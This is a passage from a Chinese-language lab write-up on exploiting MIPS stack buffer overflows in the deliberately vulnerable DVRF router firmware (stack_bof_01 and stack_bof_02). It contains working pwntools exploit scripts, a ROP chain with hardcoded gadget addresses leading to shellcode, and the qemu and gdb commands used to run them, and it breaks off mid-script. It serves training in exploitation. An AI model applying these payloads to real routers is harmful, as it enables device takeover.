</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"mips"</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">"little"</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x0040095c</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0xc8</span><span class="o">+</span><span class="sa">b</span><span class="s1">'b'</span><span class="o">*</span><span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"stack_bof_01_payload"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"> <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div><p>成功getshell：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="nb">cd</span> /home/iot/vul/DVRF/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root
</span></span><span class="line"><span class="cl">$ cp <span class="k">$(</span>which qemu-mipsel-static<span class="k">)</span> ./qemu-mipsel-static
</span></span><span class="line"><span class="cl">$ sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 <span class="s2">"`cat stack_bof_01_payload`"</span>
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224154151290" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/Z93qEMoLurXHWiw.png"/>
</figure>
</p>
<p>使用pwntools库来编写exp：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">'mips'</span><span class="p">,</span><span class="n">endian</span><span class="o">=</span><span class="s1">'little'</span><span class="p">,</span><span class="n">bits</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x0040095c</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0xc8</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'b'</span><span class="o">*</span><span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"stack_bof_01_payload"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"> <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="sa">b</span><span class="s2">"sudo chroot . ./qemu-mipsel-static  ./pwnable/Intro/stack_bof_01  </span><span class="se">\"</span><span class="s2">`cat stack_bof_01_payload`</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>注：</p>
<p>rop ret2win 时在 <code>x86</code> 平台下我们直接设置 <code>ip</code>寄存器到后面函数的地址就可以了</p>
<p>但是有时在<code>mips</code>架构上我们设置完<code>$pc</code> 寄存器可能会出现报错：访问了非法内存</p>
<p>原因在于，在 MIPS 中，函数内部会通过 <code>$t9</code> 寄存器和 <code>$gp</code> 寄存器来找数据，地址等。</p>
<p>同时在 <code>mips</code> 的手册内默认 <code>$t9</code> 的值为当前函数的开始地址，这样才能正常的索引，所以我们需要先用一个 <code>rop_gadget</code> 设置 <code>$t9</code>, 然后再跳到后门函数。</p>
<p>所以我们需要在二进制程序或者 libc 中找到类似这样一个gadgets：</p>
<p>使用 <code>jalr $t9</code> 类的 <code>gadgets</code> 以保证进入函数后， <code>$t9</code> 的值为函数的起始地址</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00006</span><span class="n">B20</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">t9</span><span class="p">,</span> <span class="n">arg_0</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00006</span><span class="n">B24</span>                 <span class="n">jalr</span>    <span class="err">$</span><span class="n">t9</span>
</span></span></code></pre></div><p>之后加上libc的基地址就行了</p>
<p>用qemu-mipsel-static模拟程序是看不到目标程序的maps的，所以我们可以通过打印 <code>got</code> 表的函数指针，然后计算偏移得到 <code>libc</code> 的基地址。</p>
<p>所以我们现在的利用流程就是:</p>
<ul>
<li>修改返回地址到 <code>rop_gadget</code>, 设置 <code>$r9</code> 为后门函数的地址</li>
<li>跳转到 后门函数，执行<code>system</code></li>
</ul>
<p>此时我们的payoad就变成了：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"a"</span> <span class="o">*</span> <span class="n">offset</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> 
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">backdoor</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"input"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></div><div class="anchor" id="dvrf-stack_bof_02"></div>
<h3 class="relative group">DVRF stack_bof_02 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#dvrf-stack_bof_02" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="静态分析-2"></div>
<h4 class="relative group">静态分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e9%9d%99%e6%80%81%e5%88%86%e6%9e%90-2" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>
<figure>
<img alt="image-20240224170521640" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/uHrJhmjSzdMtg4p.png"/>
</figure>
</p>
<p>漏洞点与stack_bof_01相同</p>
<div class="anchor" id="动态调试-2"></div>
<h4 class="relative group">动态调试 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95-2" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>方式与 stack_bof_01 相同</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ <span class="nb">cd</span> /home/iot/vul/DVRF/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root
</span></span><span class="line"><span class="cl">$ cp <span class="k">$(</span>which qemu-mipsel-static<span class="k">)</span> ./qemu-mipsel-static
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">"test"</span> &gt; content
</span></span><span class="line"><span class="cl">$ sudo chroot . ./qemu-mipsel-static -L ./ -g <span class="m">9988</span> ./pwnable/ShellCode_Required/stack_bof_02 <span class="s2">"`cat content`"</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 注意要在cat content的外面加上“”</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 另开一个终端</span>
</span></span><span class="line"><span class="cl">$ gdb-multiarch ./pwnable/ShellCode_Required/stack_bof_02
</span></span><span class="line"><span class="cl"><span class="c1"># gdb爱输入命令：</span>
</span></span><span class="line"><span class="cl"><span class="nb">set</span> arch mips 
</span></span><span class="line"><span class="cl"><span class="nb">set</span> endian big/little 
</span></span><span class="line"><span class="cl">target remote:9988
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 连上之后会停在 start ，在 main 函数开头打断点，运行到这个断点，然后就可以慢慢单步调试</span>
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240224164124477" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/jAx4rosu9bKe6SB.png"/>
</figure>
</p>
<div class="anchor" id="exp-2"></div>
<h4 class="relative group">exp 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#exp-2" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>参考：<a href="https://www.mrskye.cn/archives/6f13cd09/" target="_blank">
    DVRF 路由器漏洞靶机题目笔记 | SkYe231 Blog (mrskye.cn)</a></p>
<p>先调用 sleep(1) 就需要找 gadget 控制参数以及跳转。</p>
<p>mipsrop.find(“li $a0,1”) 控制第一个参数</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">0002</span><span class="n">FB10</span>                 <span class="n">li</span>      <span class="err">$</span><span class="n">a0</span><span class="p">,</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">0002</span><span class="n">FB14</span>                 <span class="n">move</span>    <span class="err">$</span><span class="n">t9</span><span class="p">,</span> <span class="err">$</span><span class="n">s1</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">0002</span><span class="n">FB18</span>                 <span class="n">jalr</span>    <span class="err">$</span><span class="n">t9</span> <span class="p">;</span> <span class="n">sub_2F818</span>
</span></span></code></pre></div><p>接着需要找一个控制 s1 的 gadget ，用于控制执行完 gadget1 之后跳转到哪里。mipsrop.find(“li $s1”) 结果有很多，最后选了 gadget2 = 0x00007730 ：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00007730</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">ra</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_s10</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00007734</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">s3</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_sC</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00007738</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">s2</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_s8</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">0000773</span><span class="n">C</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">s1</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_s4</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00007740</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">s0</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_s0</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00007744</span>                 <span class="n">jr</span>      <span class="err">$</span><span class="n">ra</span>
</span></span></code></pre></div><p>至此 <strong>a0 被控制为 1</strong> ，目前 payload 结构为：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">508</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"????"</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget1</span><span class="p">)</span><span class="c1">#ra</span>
</span></span></code></pre></div><p>不能直接将 sleep(0x767142b0) 填到 s1 处，因为直接填地址跳转 sleep 缺少了跳转前将返回地址放到 ra 寄存器（或压栈）的过程，当 sleep 运行到结尾的 jalr $ra 时，又会跳转会到 gadget1 ，所以要换个方式。</p>
<p>mipsrop.tails() 找通过 s0\s2\s3 寄存器跳转的 gadget ，选择了 gadget3 = 0x00020F1C ：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00020</span><span class="n">F1C</span>                 <span class="n">move</span>    <span class="err">$</span><span class="n">t9</span><span class="p">,</span> <span class="err">$</span><span class="n">s2</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00020</span><span class="n">F20</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">ra</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_sC</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00020</span><span class="n">F24</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">s2</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_s8</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00020</span><span class="n">F28</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">s1</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_s4</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00020</span><span class="n">F2C</span>                 <span class="n">lw</span>      <span class="err">$</span><span class="n">s0</span><span class="p">,</span> <span class="mh">0x18</span><span class="o">+</span><span class="n">var_s0</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00020</span><span class="n">F30</span>                 <span class="n">jr</span>      <span class="err">$</span><span class="n">t9</span>
</span></span></code></pre></div><p>解决 sleep 运行结束返回地址问题，并 lw $ra, 0x18+var_sC($sp) 控制下一层跳转，payload 结构：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">508</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget3</span><span class="p">)</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sleep</span><span class="p">)</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget1</span><span class="p">)</span><span class="c1">#ra</span>
</span></span><span class="line"><span class="cl"><span class="c1">#######</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"????"</span><span class="c1">#ra</span>
</span></span></code></pre></div><p>mipsrop.stackfinders() 找一个 gadget 提取栈地址放到寄存器中，找的时候还要注意控制下一次跳转选择 gadget4 = 0x16dd0 这个，通过 gadget3 提前将下次跳转地址写入 s0 :</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00016</span><span class="n">DD0</span>                 <span class="n">addiu</span>   <span class="err">$</span><span class="n">a0</span><span class="p">,</span> <span class="err">$</span><span class="n">sp</span><span class="p">,</span> <span class="mh">0x38</span><span class="o">+</span><span class="n">var_20</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00016</span><span class="n">DD4</span>                 <span class="n">move</span>    <span class="err">$</span><span class="n">t9</span><span class="p">,</span> <span class="err">$</span><span class="n">s0</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">00016</span><span class="n">DD8</span>                 <span class="n">jalr</span>    <span class="err">$</span><span class="n">t9</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">508</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget3</span><span class="p">)</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sleep</span><span class="p">)</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget1</span><span class="p">)</span><span class="c1">#ra</span>
</span></span><span class="line"><span class="cl"><span class="c1">#######</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"????"</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget4</span><span class="p">)</span><span class="c1">#ra</span>
</span></span></code></pre></div><p>最后找一个用 a0 跳转的 gadget ，一开始用 mipsrop.tails() 没找到，最后用 mipsrop.find(“move $t9,$a0)”) 找着了 gadget5 = 0x214a0 ，对 mipsrop 理解不够……</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">000214</span><span class="n">A0</span>                 <span class="n">move</span>    <span class="err">$</span><span class="n">t9</span><span class="p">,</span> <span class="err">$</span><span class="n">a0</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">000214</span><span class="n">A4</span>                 <span class="n">sw</span>      <span class="err">$</span><span class="n">v0</span><span class="p">,</span> <span class="mh">0x30</span><span class="o">+</span><span class="n">var_18</span><span class="p">(</span><span class="err">$</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">000214</span><span class="n">A8</span>                 <span class="n">jalr</span>    <span class="err">$</span><span class="n">t9</span>
</span></span></code></pre></div><p>最后跳转 shellcode 时，0x000214A4 的这句汇编 sw $v0, 0x30+var_18($sp) 会将 shellcode 第一个指令替换为 nop ，用无意义指令填充，将 shellcode 向后移。</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">508</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget3</span><span class="p">)</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sleep</span><span class="p">)</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget1</span><span class="p">)</span><span class="c1">#ra</span>
</span></span><span class="line"><span class="cl"><span class="c1">#######</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget5</span><span class="p">)</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget4</span><span class="p">)</span><span class="c1">#ra</span>
</span></span><span class="line"><span class="cl"><span class="c1">#######</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span></span></code></pre></div><p>最后的exp:</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">"./pwnable/ShellCode_Required/stack_bof_02"</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"mips"</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">"little"</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># libc_base = 0x766e5000</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span> <span class="o">=</span> <span class="mh">0x767142b0</span><span class="c1">#0x2F2B0+0x766e5000</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x76714b10</span>
</span></span><span class="line"><span class="cl"><span class="s1">'''
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76714b10: li a0,1
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76714b14: move t9,s1
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76714b18: jalr t9
</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x766ec730</span>
</span></span><span class="line"><span class="cl"><span class="s1">'''
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766ec730: lw ra,40(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766ec734: lw s3,36(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766ec738: lw s2,32(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766ec73c: lw s1,28(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766ec740: lw s0,24(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766ec744: jr ra
</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span>
